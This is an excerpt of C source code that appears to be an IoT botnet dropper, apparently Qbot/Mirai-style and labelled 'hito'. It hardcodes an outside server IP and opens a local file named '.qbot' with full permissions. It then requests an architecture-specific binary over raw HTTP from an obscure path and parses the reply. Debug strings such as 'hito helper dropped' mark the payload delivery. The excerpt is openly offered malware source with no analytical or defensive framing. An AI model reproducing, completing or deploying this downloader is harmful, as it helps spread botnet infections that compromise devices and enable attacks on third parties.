...
#include <errno.h>
#endif
#define HTTP_SERVER utils_inet_addr(45,95,168,250)

#define EXEC_MSG            "hito helper dropped\n"
#define EXEC_MSG_LEN        20

#define DOWNLOAD_MSG        "hito helper airdropped\n"
#define DOWNLOAD_MSG_LEN    24
...
inline void run(void)
{
    ...
    ffd = open(".qbot", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /swrgiuhguhwrguiwetu/" BOT_ARCH " HTTP/1.0\r\n\r\n", 25 + arch_strlen + 13) != (25 + arch_strlen + 13))
    {
#ifdef DEBUG
    ...
    while (header_parser != 0x0d0a0d0a)
    {
        ...
        if (ret != 1){
            #ifdef DEBUG
                printf("error while header parsing: %d: strerror: %s\n", errno, strerror(errno));
            #endif
            __exit(4);
        }
